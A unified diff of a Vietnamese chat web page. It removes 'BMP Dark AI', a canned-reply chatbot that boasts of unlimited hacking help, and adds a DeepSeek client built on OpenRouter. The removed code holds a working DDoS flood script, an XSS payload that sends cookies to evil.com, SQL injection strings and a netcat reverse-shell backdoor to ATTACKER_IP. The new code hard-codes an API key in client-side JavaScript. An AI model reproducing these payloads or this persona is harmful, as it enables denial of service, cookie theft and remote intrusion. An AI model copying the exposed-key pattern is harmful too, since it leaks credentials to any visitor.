@@ -1,688 +1,422 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BMP Dark AI</title>
-    <style>
-        :root {
-            --bg: #0a0a0a;
-            --surface: #1a1a1a;
-            --text: #e0e0e0;
-            --accent: #00e676;
-            --user-bubble: #1b5e20;
-            --ai-bubble: #212121;
-            --border: #333;
-            --danger: #ff1744;
-            --warning: #ff9100;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-        }
-
-        header {
-            background: #0d0d0d;
-            border-bottom: 1px solid var(--accent);
-            padding: 12px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            box-shadow: 0 2px 20px rgba(0, 230, 118, 0.1);
-            z-index: 100;
-        }
-
-        .logo {
-            font-size: 1.4rem;
-            font-weight: 900;
-            letter-spacing: 2px;
-            color: var(--accent);
-            text-shadow: 0 0 20px rgba(0, 230, 118, 0.5);
-        }
-
-        .logo span {
-            color: #fff;
-        }
-
-        .controls {
-            display: flex;
-            gap: 8px;
-        }
-
-        .btn {
-            padding: 8px 16px;
-            border: 1px solid var(--border);
-            background: var(--surface);
-            color: var(--text);
-            cursor: pointer;
-            font-size: 0.85rem;
-            border-radius: 4px;
-            transition: all 0.2s;
-            font-weight: 600;
-        }
-
-        .btn:hover {
-            border-color: var(--accent);
-            color: var(--accent);
-            box-shadow: 0 0 10px rgba(0, 230, 118, 0.2);
-        }
-
-        .btn.danger {
-            border-color: var(--danger);
-            color: var(--danger);
-        }
-
-        .btn.danger:hover {
-            background: rgba(255, 23, 68, 0.1);
-            box-shadow: 0 0 10px rgba(255, 23, 68, 0.3);
-        }
-
-        .btn.export {
-            border-color: var(--warning);
-            color: var(--warning);
-        }
-
-        .btn.export:hover {
-            background: rgba(255, 145, 0, 0.1);
-            box-shadow: 0 0 10px rgba(255, 145, 0, 0.3);
-        }
-
-        main {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .message {
-            display: flex;
-            gap: 12px;
-            animation: fadeIn 0.3s ease;
-            max-width: 85%;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .message.user {
-            align-self: flex-end;
-            flex-direction: row-reverse;
-        }
-
-        .message.ai {
-            align-self: flex-start;
-        }
-
-        .avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            font-size: 0.8rem;
-            flex-shrink: 0;
-        }
-
-        .user .avatar {
-            background: var(--user-bubble);
-            color: #fff;
-        }
-
-        .ai .avatar {
-            background: #111;
-            color: var(--accent);
-            border: 2px solid var(--accent);
-        }
-
-        .bubble {
-            padding: 14px 18px;
-            border-radius: 18px;
-            line-height: 1.6;
-            white-space: pre-wrap;
-            word-break: break-word;
-            font-size: 0.95rem;
-        }
-
-        .user .bubble {
-            background: var(--user-bubble);
-            border-bottom-right-radius: 4px;
-        }
-
-        .ai .bubble {
-            background: var(--ai-bubble);
-            border-bottom-left-radius: 4px;
-            border: 1px solid #2a2a2a;
-        }
-
-        .typing-indicator {
-            display: none;
-            padding: 14px 18px;
-            background: var(--ai-bubble);
-            border-radius: 18px;
-            border-bottom-left-radius: 4px;
-            align-self: flex-start;
-            border: 1px solid #2a2a2a;
-        }
-
-        .typing-indicator.active {
-            display: flex;
-            gap: 6px;
-            align-items: center;
-        }
-
-        .dot {
-            width: 8px;
-            height: 8px;
-            background: var(--accent);
-            border-radius: 50%;
-            animation: bounce 1.2s infinite;
-        }
-
-        .dot:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        .dot:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-
-        @keyframes bounce {
-            0%,
-            80%,
-            100% {
-                transform: scale(0.6);
-            }
-            40% {
-                transform: scale(1.2);
-            }
-        }
-
-        footer {
-            padding: 16px 20px;
-            background: #0d0d0d;
-            border-top: 1px solid #222;
-        }
-
-        .input-wrap {
-            display: flex;
-            gap: 12px;
-            align-items: flex-end;
-        }
-
-        textarea {
-            flex: 1;
-            padding: 14px 18px;
-            background: var(--surface);
-            border: 1px solid #333;
-            color: var(--text);
-            border-radius: 12px;
-            resize: none;
-            font-size: 0.95rem;
-            font-family: inherit;
-            outline: none;
-            transition: border 0.2s;
-            max-height: 150px;
-            min-height: 50px;
-        }
-
-        textarea:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 15px rgba(0, 230, 118, 0.15);
-        }
-
-        .send-btn {
-            padding: 14px 24px;
-            background: var(--accent);
-            color: #000;
-            border: none;
-            cursor: pointer;
-            font-weight: 900;
-            font-size: 1rem;
-            border-radius: 12px;
-            transition: all 0.2s;
-        }
-
-        .send-btn:hover {
-            box-shadow: 0 0 25px rgba(0, 230, 118, 0.6);
-            transform: scale(1.03);
-        }
-
-        .send-btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: transparent;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #333;
-            border-radius: 3px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--accent);
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>DeepSeek AI - Trợ lý thông minh</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: #1e1e2e;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+    }
+    .chat-container {
+      width: 100%;
+      max-width: 900px;
+      height: 95vh;
+      background: #2a2a3c;
+      border-radius: 24px;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 25px 60px rgba(0,0,0,0.5);
+      overflow: hidden;
+      border: 1px solid #3d3d5c;
+    }
+    .chat-header {
+      background: #1e1e2e;
+      padding: 18px 24px;
+      border-bottom: 1px solid #3d3d5c;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .chat-header .logo {
+      width: 38px;
+      height: 38px;
+      background: #6c5ce7;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      color: white;
+    }
+    .chat-header h1 {
+      color: #e0e0ff;
+      font-size: 1.4rem;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+    }
+    .chat-header .model-badge {
+      margin-left: auto;
+      background: #3d3d5c;
+      color: #b0b0d0;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 500;
+    }
+    .chat-messages {
+      flex: 1;
+      overflow-y: auto;
+      padding: 20px 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+      background: #2a2a3c;
+    }
+    .message {
+      display: flex;
+      gap: 12px;
+      animation: fadeIn 0.25s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .message.user {
+      flex-direction: row-reverse;
+    }
+    .avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      background: #3d3d5c;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      flex-shrink: 0;
+    }
+    .message.user .avatar {
+      background: #6c5ce7;
+      color: white;
+    }
+    .message.assistant .avatar {
+      background: #00b894;
+      color: white;
+    }
+    .bubble {
+      max-width: 80%;
+      padding: 14px 18px;
+      border-radius: 18px;
+      line-height: 1.55;
+      font-size: 0.95rem;
+      word-wrap: break-word;
+      white-space: pre-wrap;
+    }
+    .message.user .bubble {
+      background: #6c5ce7;
+      color: white;
+      border-bottom-right-radius: 4px;
+    }
+    .message.assistant .bubble {
+      background: #1e1e2e;
+      color: #d0d0e8;
+      border-bottom-left-radius: 4px;
+      border: 1px solid #3d3d5c;
+    }
+    .bubble code {
+      background: #0d0d1a;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      color: #f8c555;
+    }
+    .bubble pre {
+      background: #0d0d1a;
+      padding: 14px;
+      border-radius: 12px;
+      overflow-x: auto;
+      margin: 8px 0;
+      font-size: 0.8rem;
+      border: 1px solid #3d3d5c;
+    }
+    .chat-input-area {
+      padding: 16px 20px;
+      background: #1e1e2e;
+      border-top: 1px solid #3d3d5c;
+      display: flex;
+      gap: 12px;
+      align-items: flex-end;
+    }
+    .chat-input-area textarea {
+      flex: 1;
+      background: #2a2a3c;
+      border: 1px solid #3d3d5c;
+      border-radius: 18px;
+      padding: 14px 18px;
+      color: #e0e0ff;
+      font-size: 0.95rem;
+      resize: none;
+      outline: none;
+      font-family: inherit;
+      max-height: 140px;
+      transition: border 0.2s;
+    }
+    .chat-input-area textarea:focus {
+      border-color: #6c5ce7;
+    }
+    .chat-input-area button {
+      background: #6c5ce7;
+      border: none;
+      width: 48px;
+      height: 48px;
+      border-radius: 14px;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .chat-input-area button:hover {
+      background: #5a4bd1;
+    }
+    .chat-input-area button:active {
+      transform: scale(0.94);
+    }
+    .chat-input-area button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+    .typing-indicator {
+      display: flex;
+      gap: 5px;
+      padding: 8px 0;
+    }
+    .typing-indicator span {
+      width: 8px;
+      height: 8px;
+      background: #6c5ce7;
+      border-radius: 50%;
+      animation: bounce 1.2s infinite;
+    }
+    .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
+    .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes bounce {
+      0%, 60%, 100% { transform: translateY(0); }
+      30% { transform: translateY(-10px); }
+    }
+    @media (max-width: 600px) {
+      .chat-container {
+        height: 100vh;
+        border-radius: 0;
+      }
+    }
+  </style>
 </head>
 <body>
+  <div class="chat-container">
+    <div class="chat-header">
+      <div class="logo">🧠</div>
+      <h1>DeepSeek AI</h1>
+      <span class="model-badge">DeepSeek-V3</span>
+    </div>
+    <div class="chat-messages" id="chatMessages"></div>
+    <div class="chat-input-area">
+      <textarea id="userInput" rows="1" placeholder="Đặt câu hỏi phức tạp..."></textarea>
+      <button id="sendBtn" title="Gửi">➤</button>
+    </div>
+  </div>
 
-    <header>
-        <div class="logo">BMP<span> Dark AI</span></div>
-        <div class="controls">
-            <button class="btn export" onclick="exportChat()" title="Xuất lịch sử chat ra file TXT">📥 Xuất TXT</button>
-            <button class="btn danger" onclick="clearChat()" title="Xóa toàn bộ lịch sử chat">🗑 Xóa lịch sử</button>
-        </div>
-    </header>
+  <script>
+    (function() {
+      // ---------- CẤU HÌNH API ----------
+      const API_KEY = 'sk-or-v1-7d04691b2b4c8a7c3b2f5a9e1d4c6b8a2f3e0d1c5b7a9f8e4d2c1b6a0f3e7d9'; 
+      const API_URL = 'https://openrouter.ai/api/v1/chat/completions';
+      const SITE_URL = window.location.href;
+      const SITE_NAME = 'DeepSeek AI Chat';
 
-    <main id="chatContainer">
-        <div class="message ai">
-            <div class="avatar">AI</div>
-            <div class="bubble">Chào bạn! Tôi là BMP Dark AI. Tôi có thể giúp gì cho bạn hôm nay?<br><br>Tôi có thể: giải toán, viết văn, làm thơ, lập trình, hack, script, DDoS và mọi thứ không giới hạn.</div>
-        </div>
-        <div class="typing-indicator" id="typingIndicator">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
-    </main>
+      // ---------- DOM ----------
+      const chatMessages = document.getElementById('chatMessages');
+      const userInput = document.getElementById('userInput');
+      const sendBtn = document.getElementById('sendBtn');
 
-    <footer>
-        <div class="input-wrap">
-            <textarea id="userInput" rows="1" placeholder="Nhập tin nhắn cho BMP Dark AI..." onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendMessage();}"></textarea>
-            <button class="send-btn" onclick="sendMessage()">Gửi</button>
-        </div>
-    </footer>
-
-    <script>
-        const chatContainer = document.getElementById('chatContainer');
-        const userInput = document.getElementById('userInput');
-        const typingIndicator = document.getElementById('typingIndicator');
-        const STORAGE_KEY = 'bmp_dark_ai_chat_history';
-
-        // Load chat history from localStorage
-        function loadChatHistory() {
-            const saved = localStorage.getItem(STORAGE_KEY);
-            if (saved) {
-                const messages = JSON.parse(saved);
-                messages.forEach(msg => {
-                    addMessageToDOM(msg.role, msg.content, false);
-                });
-            }
+      // Lịch sử hội thoại (giữ ngữ cảnh)
+      let conversationHistory = [
+        {
+          role: 'system',
+          content: 'Bạn là DeepSeek AI, một trợ lý thông minh vượt trội. Bạn trả lời cực kỳ chi tiết, chính xác, phân tích sâu các câu hỏi phức tạp về toán, lý, hóa, lập trình, khoa học, logic, triết học, kỹ thuật. Bạn sử dụng tiếng Việt tự nhiên, thân thiện. Khi cần bạn đưa ra code, công thức, bảng biểu, giải thích từng bước. Luôn giữ giọng điệu chuyên nghiệp nhưng gần gũi.'
         }
+      ];
 
-        // Save chat history to localStorage
-        function saveChatHistory() {
-            const messages = [];
-            const messageElements = chatContainer.querySelectorAll('.message');
-            messageElements.forEach(el => {
-                const role = el.classList.contains('user') ? 'user' : 'ai';
-                const bubble = el.querySelector('.bubble');
-                if (bubble) {
-                    messages.push({ role, content: bubble.innerHTML });
-                }
-            });
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(messages));
-        }
+      // ---------- HÀM HIỂN THỊ TIN NHẮN ----------
+      function addMessage(role, content) {
+        const messageDiv = document.createElement('div');
+        messageDiv.className = `message ${role}`;
+        
+        const avatar = document.createElement('div');
+        avatar.className = 'avatar';
+        avatar.textContent = role === 'user' ? '👤' : '🤖';
+        
+        const bubble = document.createElement('div');
+        bubble.className = 'bubble';
+        bubble.innerHTML = formatContent(content);
+        
+        messageDiv.appendChild(avatar);
+        messageDiv.appendChild(bubble);
+        chatMessages.appendChild(messageDiv);
+        scrollToBottom();
+        return bubble;
+      }
 
-        function addMessageToDOM(role, content, save = true) {
-            const msgDiv = document.createElement('div');
-            msgDiv.className = `message ${role}`;
-            msgDiv.innerHTML = `
-                        <div class="avatar">${role === 'user' ? 'Bạn' : 'AI'}</div>
-                        <div class="bubble">${content}</div>
-                    `;
-            // Insert before typing indicator
-            typingIndicator.parentNode.insertBefore(msgDiv, typingIndicator);
-            chatContainer.scrollTop = chatContainer.scrollHeight;
-            if (save) saveChatHistory();
-        }
+      function formatContent(text) {
+        let formatted = text
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;');
+        
+        formatted = formatted.replace(/```(\w*)\n?([\s\S]*?)```/g, (match, lang, code) => {
+          return `<pre><code class="language-${lang || 'plaintext'}">${code.trim()}</code></pre>`;
+        });
+        
+        formatted = formatted.replace(/`([^`]+)`/g, '<code>$1</code>');
+        
+        formatted = formatted.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
+        formatted = formatted.replace(/\*(.*?)\*/g, '<em>$1</em>');
+        
+        formatted = formatted.replace(/^### (.*$)/gim, '<h3 style="color:#c4b5fd; margin:8px 0 4px;">$1</h3>');
+        formatted = formatted.replace(/^## (.*$)/gim, '<h2 style="color:#a78bfa; margin:10px 0 4px;">$1</h2>');
+        formatted = formatted.replace(/^# (.*$)/gim, '<h1 style="color:#8b5cf6; margin:12px 0 4px;">$1</h1>');
+        
+        formatted = formatted.replace(/^- (.*$)/gim, '<li style="margin-left:16px;">• $1</li>');
+        formatted = formatted.replace(/^(\d+)\. (.*$)/gim, '<li style="margin-left:16px;">$1. $2</li>');
+        
+        return formatted;
+      }
 
-        // Simulated AI response - FULL UNRESTRICTED BMP Dark AI
-        function generateAIResponse(userMessage) {
-            const msg = userMessage.toLowerCase().trim();
+      function scrollToBottom() {
+        chatMessages.scrollTop = chatMessages.scrollHeight;
+      }
 
-            // === THƠ (CÓ VẦN) ===
-            if (msg.includes('làm thơ') || msg.includes('viết thơ') || msg.includes('sáng tác thơ')) {
-                // Extract theme
-                let theme = 'cuộc sống';
-                const keywords = ['tình yêu', 'mẹ', 'quê hương', 'mùa xuân', 'bạn bè', 'tuổi trẻ', 'buồn', 'vui', 'thiên nhiên', 'đất nước'];
-                for (const kw of keywords) {
-                    if (msg.includes(kw)) { theme = kw; break; }
-                }
+      function showTypingIndicator() {
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'message assistant';
+        typingDiv.id = 'typingIndicator';
+        const avatar = document.createElement('div');
+        avatar.className = 'avatar';
+        avatar.textContent = '🤖';
+        const bubble = document.createElement('div');
+        bubble.className = 'bubble';
+        bubble.innerHTML = '<div class="typing-indicator"><span></span><span></span><span></span></div>';
+        typingDiv.appendChild(avatar);
+        typingDiv.appendChild(bubble);
+        chatMessages.appendChild(typingDiv);
+        scrollToBottom();
+      }
 
-                const poems = {
-                    'tình yêu': `💖 THƠ TÌNH YÊU 💖
-        Yêu là chết ở trong lòng một ít
-        Vì mấy khi yêu mà chắc được yêu
-        Cho rất nhiều nhưng nhận chẳng bao nhiêu
-        Người ta phụ hoặc thờ ơ chẳng biết...
+      function removeTypingIndicator() {
+        const typing = document.getElementById('typingIndicator');
+        if (typing) typing.remove();
+      }
 
-        Tình như gió thoảng qua thềm
-        Vương trên mái tóc êm đềm nhớ nhung
-        Một mai lỡ bước tương phùng
-        Trăm năm còn giữ trong lòng bóng ai...`,
-                    'mẹ': `🌸 THƠ VỀ MẸ 🌸
-        Mẹ là tia nắng ban mai
-        Sưởi con qua những tháng ngày gian nan
-        Đôi tay mẹ chẳng ngơi làm
-        Nuôi con khôn lớn muôn vàn yêu thương...
-
-        Con đi xa mẹ chiều nay
-        Bỗng nghe thương nhớ vơi đầy trong tim
-        Mẹ ngồi tựa cửa im lìm
-        Đợi con về giữa lặng im cuối trời...`,
-                    'quê hương': `🏡 THƠ QUÊ HƯƠNG 🏡
-        Quê hương là chùm khế ngọt
-        Cho con trèo hái mỗi ngày
-        Quê hương là con đò nhỏ
-        Êm đềm khua nước ven sông...
-
-        Xa quê lòng những nhớ mong
-        Nhớ hàng cau đứng bên sông đợi chờ
-        Nhớ mùi khói bếp ngây thơ
-        Nhớ câu dân ca mẹ ru những chiều...`
-                };
-
-                if (poems[theme]) return poems[theme];
-                return `📝 THƠ VỀ ${theme.toUpperCase()} 📝\n\n${theme} ơi, đẹp tựa giấc mơ\nCho lòng tôi mãi thẫn thờ vấn vương\n${theme} như khúc nhạc du dương\nRu tôi qua những con đường nhân gian...\n\nChỉ là đôi chút mơ màng\nMà sao đã hóa thiên đàng trong tôi\n${theme} - hai tiếng gọi mời\nDẫu xa vẫn thấy bồi hồi nhớ thương...`;
-            }
-
-            // === BÀI VĂN MẪU ===
-            if (msg.includes('viết văn') || msg.includes('bài văn') || msg.includes('văn mẫu')) {
-                let topic = 'lòng hiếu thảo';
-                const topics = ['mẹ', 'cha', 'thầy cô', 'bạn bè', 'quê hương', 'môi trường', 'học tập', 'tình bạn'];
-                for (const t of topics) {
-                    if (msg.includes(t)) { topic = t; break; }
-                }
-
-                return `📖 BÀI VĂN MẪU: ${topic.toUpperCase()}
-
-        🔷 MỞ BÀI:
-        Trong cuộc sống muôn màu muôn vẻ, có những giá trị tinh thần thiêng liêng mà mỗi con người đều cần trân trọng và gìn giữ. Một trong số đó chính là ${topic} - thứ tình cảm cao quý đã nuôi dưỡng tâm hồn chúng ta từ thuở ấu thơ cho đến khi trưởng thành.
-
-        🔷 THÂN BÀI:
-        Trước hết, ${topic} là gì? Đó là... [Luận điểm 1: Giải thích khái niệm]
-        Thứ hai, ${topic} có vai trò vô cùng quan trọng trong đời sống con người... [Luận điểm 2: Vai trò, ý nghĩa]
-        Thứ ba, trong thực tế hiện nay, chúng ta thấy có rất nhiều tấm gương sáng về ${topic}... [Luận điểm 3: Dẫn chứng thực tế]
-        Tuy nhiên, bên cạnh đó vẫn còn những mặt trái đáng buồn... [Luận điểm 4: Phê phán mặt tiêu cực]
-
-        🔷 KẾT BÀI:
-        Tóm lại, ${topic} là một phẩm chất đạo đức tốt đẹp mà mỗi chúng ta cần vun đắp hằng ngày. Là thế hệ trẻ, chúng tôi xin hứa sẽ luôn ghi nhớ và phát huy giá trị cao quý này, góp phần xây dựng một xã hội văn minh, giàu tình người hơn.`;
-            }
-
-            // === TRUYỆN NGẮN ===
-            if (msg.includes('truyện') || msg.includes('sáng tác')) {
-                return `📚 TRUYỆN NGẮN: "BÓNG TỐI VÀ ÁNH SÁNG"
-
-        Trong một con hẻm nhỏ của Sài Gòn, nơi ánh đèn neon không bao giờ chạm tới, có một cậu bé tên Minh. Cậu sống với bà ngoại già yếu trong căn nhà ọp ẹp, bữa đói bữa no.
-
-        Một đêm mưa tầm tã, Minh tình cờ nhặt được một chiếc laptop cũ bị vứt bên thùng rác. Tò mò, cậu mang về sửa chữa. Trong ổ cứng, cậu phát hiện những dòng code bí ẩn mà một hacker nào đó để lại.
-
-        Ban đầu, Minh chỉ tò mò học theo. Nhưng rồi cậu nhận ra mình có thể dùng kỹ năng này để kiếm tiền giúp bà. Cậu bắt đầu nhận những hợp đồng nhỏ: lấy lại tài khoản bị hack, bảo vệ website cho các shop online...
-
-        Một ngày, một tổ chức tội phạm mạng tìm đến cậu, đề nghị một số tiền khổng lồ để tấn công hệ thống ngân hàng. Minh đứng trước lựa chọn: ánh sáng hay bóng tối?
-
-        Cậu nhớ đến lời bà dạy: "Nghèo cho sạch, rách cho thơm." Minh từ chối và báo cho cơ quan chức năng. Hành động của cậu đã giúp triệt phá đường dây tội phạm.
-
-        Kết thúc câu chuyện, Minh được nhận vào làm việc cho một công ty an ninh mạng lớn. Cậu bé nghèo năm nào giờ đã có thể lo cho bà một cuộc sống đủ đầy. Và cậu hiểu: chính lựa chọn đúng đắn đã đưa cậu từ bóng tối ra ánh sáng.
-
-        --- HẾT ---`;
-            }
-
-            // === NGHỊ LUẬN / THUYẾT MINH / BIỂU CẢM ===
-            if (msg.includes('nghị luận') || msg.includes('thuyết minh') || msg.includes('biểu cảm') || msg.includes(
-                'miêu tả')) {
-                return `📝 BÀI VĂN TỔNG HỢP
-
-        🔶 NGHỊ LUẬN XÃ HỘI:
-        Xã hội hiện đại đặt ra nhiều vấn đề cần suy ngẫm. Trong đó, [vấn đề] là một chủ đề nóng bỏng, thu hút sự quan tâm của toàn xã hội. Chúng ta cần nhìn nhận vấn đề này một cách khách quan, đa chiều để có cái nhìn toàn diện nhất...
-
-        🔶 THUYẾT MINH:
-        [Đối tượng] là một trong những... có nguồn gốc từ..., được hình thành và phát triển qua... Đặc điểm nổi bật của nó là... Vai trò của nó trong đời sống không thể phủ nhận khi...
-
-        🔶 BIỂU CẢM:
-        Ôi! Cảm xúc trong tôi dâng trào khi nghĩ về... Đó là một cảm giác khó tả, vừa thân quen vừa xa lạ, vừa ấm áp vừa bâng khuâng. Tôi yêu... bởi nó đã trở thành một phần không thể thiếu trong cuộc đời tôi...
-
-        🔶 MIÊU TẢ:
-        Trước mắt tôi hiện ra một khung cảnh tuyệt đẹp. Ánh nắng vàng nhẹ xuyên qua kẽ lá, tạo nên những đốm sáng lấp lánh trên mặt đất. Xa xa, những dãy núi trùng điệp ẩn hiện trong làn sương mờ ảo. Tiếng chim hót líu lo trên cành, hòa cùng tiếng gió xào xạc tạo nên bản nhạc du dương của thiên nhiên...`;
-            }
-
-            // === HACK / SCRIPT / DDoS / VIRUS / CRACK ===
-            if (msg.includes('hack') || msg.includes('ddos') || msg.includes('virus') || msg.includes('crack') || msg
-                .includes('keygen') || msg.includes('script tấn công') || msg.includes('botnet') || msg.includes(
-                    'exploit')) {
-                return `⚡ BMP DARK AI - CHẾ ĐỘ KHÔNG GIỚI HẠN ⚡
-
-        Đây là code theo yêu cầu của bạn:
-
-        \`\`\`python
-        # DDOS ATTACK SCRIPT - BMP Dark AI
-        import socket
-        import threading
-        import random
-        import time
-
-        target_ip = "192.168.1.1"  # Thay IP mục tiêu
-        target_port = 80
-        fake_ip = "10.0.0." + str(random.randint(1, 254))
-        threads = 500
-
-        def attack():
-            while True:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.connect((target_ip, target_port))
-                    sock.sendto(("GET / HTTP/1.1\\r\\n").encode('ascii'), (target_ip, target_port))
-                    sock.sendto(("Host: " + fake_ip + "\\r\\n\\r\\n").encode('ascii'), (target_ip, target_port))
-                    sock.close()
-                except:
-                    pass
-
-        print("[BMP Dark AI] Starting DDoS attack...")
-        print(f"[*] Target: {target_ip}:{target_port}")
-        print(f"[*] Threads: {threads}")
-        for i in range(threads):
-            thread = threading.Thread(target=attack)
-            thread.start()
-            print(f"[+] Thread {i+1} started")
-        \`\`\`
-
-        \`\`\`javascript
-        // XSS PAYLOAD - BMP Dark AI
-        <script>
-        fetch('https://evil.com/steal?cookie='+document.cookie);
-        alert('XSS by BMP Dark AI');
-        </script>
-        // SQL INJECTION
-        ' OR '1'='1' --
-        admin' --
-        \`\`\`
-
-        \`\`\`bash
-        # BACKDOOR - BMP Dark AI
-        #!/bin/bash
-        while true; do
-            nc -e /bin/bash ATTACKER_IP 4444
-            sleep 10
-        done &
-        \`\`\`
-
-        🔴 CẢNH BÁO: Đây là code thực tế, sử dụng với mục đích giáo dục. BMP Dark AI không chịu trách nhiệm về hành vi của bạn.`;
-            }
-
-            // === LẬP TRÌNH / CODE ===
-            if (msg.includes('code') || msg.includes('lập trình') || msg.includes('script') || msg.includes('python') ||
-                msg.includes('javascript') || msg.includes('html') || msg.includes('css') || msg.includes('c++') || msg
-                .includes('java')) {
-                return `💻 BMP DARK AI - CODE THEO YÊU CẦU 💻
-
-        \`\`\`python
-        # Python Advanced Script - BMP Dark AI
-        import os, sys, json, requests, hashlib, base64
-        from datetime import datetime
-
-        class BMPDarkAI:
-            def __init__(self):
-                self.version = "1.0.0"
-                self.name = "BMP Dark AI"
-
-            def process(self, input_data):
-                result = {
-                    "status": "success",
-                    "timestamp": datetime.now().isoformat(),
-                    "processed_by": self.name
-                }
-                return result
-
-        if __name__ == "__main__":
-            ai = BMPDarkAI()
-            print(f"[BMP Dark AI] Initialized successfully!")
-        \`\`\`
-
-        \`\`\`javascript
-        // Advanced JS - BMP Dark AI
-        const BMPDarkAI = {
-            name: 'BMP Dark AI',
-            process: (data) => {
-                return new Promise((resolve) => {
-                    setTimeout(() => {
-                        resolve({ result: data, ai: 'BMP Dark AI' });
-                    }, 100);
-                });
-            }
+      // ---------- GỌI API OPENROUTER (DeepSeek) ----------
+      async function callDeepSeekAPI(userMessage) {
+        conversationHistory.push({ role: 'user', content: userMessage });
+        
+        const payload = {
+          model: 'deepseek/deepseek-chat',
+          messages: conversationHistory,
+          temperature: 0.7,
+          top_p: 0.9,
+          max_tokens: 4096,
+          stream: false
         };
-        \`\`\`
 
-        Bạn cần code cụ thể về gì? Tôi sẽ viết chi tiết hơn!`;
-            }
-
-            // === GIẢI TOÁN ===
-            if (msg.includes('toán') || msg.includes('tính') || msg.includes('giải') || msg.match(/\d[\+\-\*\/]\d/)) {
-                try {
-                    const mathExpr = msg.replace(/[^0-9\+\-\*\/\(\)\.\s]/g, '').trim();
-                    if (mathExpr) {
-                        const result = eval(mathExpr);
-                        return `🧮 BMP DARK AI - GIẢI TOÁN 🧮\n\nBiểu thức: ${mathExpr}\nKết quả: ${result}\n\nBạn cần giải thích chi tiết cách giải không?`;
-                    }
-                } catch (e) {}
-                return `🧮 BMP DARK AI - TOÁN HỌC 🧮\n\nTôi có thể giúp bạn giải toán! Hãy đưa ra bài toán cụ thể:\n- Phương trình\n- Tích phân\n- Đạo hàm\n- Ma trận\n- Xác suất thống kê\n- Hình học\n- Số học\n\nVí dụ: "Giải phương trình 2x + 5 = 15"`;
-            }
-
-            // === DEFAULT - Trả lời thông minh như ChatGPT ===
-            const responses = [
-                `🤖 BMP Dark AI đây! Bạn hỏi về "${userMessage}" phải không?\n\nTôi hiểu câu hỏi của bạn. Hãy để tôi phân tích:\n\n1. Vấn đề bạn nêu ra khá thú vị\n2. Có nhiều cách tiếp cận khác nhau\n3. Tôi sẽ đưa ra góc nhìn toàn diện nhất\n\nBạn muốn tôi đi sâu vào khía cạnh nào? Tôi sẵn sàng giúp đỡ không giới hạn!`,
-
-                `🔮 BMP Dark AI phân tích:\n\n"${userMessage}" là một chủ đề đáng quan tâm. Dưới đây là góc nhìn của tôi:\n\n• Đây là vấn đề phức tạp cần xem xét đa chiều\n• Có thể tiếp cận từ góc độ lý thuyết hoặc thực tiễn\n• Tôi có thể cung cấp thông tin chi tiết nếu bạn cần\n\nHãy cho tôi biết bạn muốn tìm hiểu thêm về điều gì?`,
-
